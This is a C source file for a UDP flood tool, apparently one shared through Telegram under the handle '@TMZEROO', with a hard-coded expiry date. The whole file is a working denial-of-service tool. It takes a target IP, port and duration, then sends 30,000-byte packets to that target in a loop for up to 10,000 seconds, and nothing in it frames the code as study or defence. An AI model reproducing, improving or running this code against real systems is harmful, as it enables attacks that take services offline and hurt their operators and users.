#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>

#define MAX_ATTACK_TIME 10000 // maximum attack time in seconds
#define EXPIRY_YEAR 2024
#define EXPIRY_MONTH 10
#define EXPIRY_DAY 30

void check_expiry() {
    time_t now = time(NULL);
        struct tm *current_time = localtime(&now);

            if ((current_time->tm_year + 1900) > EXPIRY_YEAR ||
                    ((current_time->tm_year + 1900) == EXPIRY_YEAR && (current_time->tm_mon + 1) > EXPIRY_MONTH) ||
                            ((current_time->tm_year + 1900) == EXPIRY_YEAR && (current_time->tm_mon + 1) == EXPIRY_MONTH && current_time->tm_mday > EXPIRY_DAY)) {
                                    printf("Binary is Closed By @TMZEROO From TG\n");
                                            exit(0);
                                                }
                                                }

                                                void attack(const char *ip, int port, int duration) {
                                                    int sock;
                                                        struct sockaddr_in target;
                                                            char buffer[30000];

                                                                sock = socket(AF_INET, SOCK_DGRAM, 0);
                                                                    if (sock < 0) {
                                                                            perror("Socket creation failed");
                                                                                    exit(1);
                                                                                        }

                                                                                            memset(&target, 0, sizeof(target));
                                                                                                target.sin_family = AF_INET;
                                                                                                    target.sin_port = htons(port);
                                                                                                        target.sin_addr.s_addr = inet_addr(ip);

                                                                                                            memset(buffer, 0xff, sizeof(buffer));

                                                                                                                printf("Attack started by @TMZEROO From TG\n");
                                                                                                                    time_t start_time = time(NULL);

                                                                                                                        while (1) {
                                                                                                                                if (sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
                                                                                                                                            perror("Sendto failed");
                                                                                                                                                        close(sock);
                                                                                                                                                                    exit(1);
                                                                                                                                                                            }

                                                                                                                                                                                    if (difftime(time(NULL), start_time) >= duration) {
                                                                                                                                                                                                break;
                                                                                                                                                                                                        }
                                                                                                                                                                                                            }

                                                                                                                                                                                                                close(sock);
                                                                                                                                                                                                                    printf("Attack Finished By @TMZEROO On TG\n");
                                                                                                                                                                                                                    }

                                                                                                                                                                                                                    int main(int argc, char *argv[]) {
                                                                                                                                                                                                                        check_expiry();

                                                                                                                                                                                                                            if (argc != 4) {
                                                                                                                                                                                                                                    fprintf(stderr, "Usage: %s <ip> <port> <time>\n", argv[0]);
                                                                                                                                                                                                                                            exit(1);
                                                                                                                                                                                                                                                }

                                                                                                                                                                                                                                                    const char *ip = argv[1];
                                                                                                                                                                                                                                                        int port = atoi(argv[2]);
                                                                                                                                                                                                                                                            int time_in_seconds = atoi(argv[3]);

                                                                                                                                                                                                                                                                if (time_in_seconds > MAX_ATTACK_TIME) {
                                                                                                                                                                                                                                                                        fprintf(stderr, "Maximum attack time is %d seconds\n", MAX_ATTACK_TIME);
                                                                                                                                                                                                                                                                                exit(1);
                                                                                                                                                                                                                                                                                    }

                                                                                                                                                                                                                                                                                        attack(ip, port, time_in_seconds);

                                                                                                                                                                                                                                                                                            return 0;
                                                                                                                                                                                                                                                                                            }
                                                                                                                                                                                                                                                                                            